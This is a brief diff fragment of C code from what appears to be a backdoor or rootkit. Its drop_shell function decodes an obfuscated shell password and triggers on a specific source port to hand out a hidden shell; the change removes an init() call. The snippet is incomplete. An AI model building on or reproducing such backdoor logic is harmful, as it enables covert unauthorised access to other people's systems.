@@ -9,7 +9,7 @@ int drop_shell(int sock, struct sockaddr *addr)
 	char *shellpw = strdup(SHELLPW); xor(shellpw); 
 	int pid; 
 	ssize_t (*s_write()); 
-	init(); 
+	
 	struct sockaddr_in *sa_i = (struct sockaddr_in*)addr; 
 
 	if (htons(sa_i->sin_port) == DEFAULT_PORT)
